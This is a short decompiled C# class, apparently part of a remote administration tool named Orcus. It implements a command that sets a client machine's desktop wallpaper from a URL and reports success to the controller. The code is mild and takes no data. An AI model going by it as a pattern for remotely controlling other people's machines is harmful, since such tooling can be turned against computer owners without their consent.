using Orcus.Commands.FunActions;
using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.StaticCommands.System;

namespace Orcus.StaticCommands;

public class ChangeWallpaperCommandEx : ChangeWallpaperCommand
{
	public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory, IClientInfo clientInfo)
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		commandParameter.InitializeProperties((StaticCommand)(object)this);
		DesktopWallpaper.Set(((ChangeWallpaperCommand)this).get_WallpaperUrl(), ((ChangeWallpaperCommand)this).get_DesktopWallpaperStyle());
		feedbackFactory.Succeeded();
	}
}
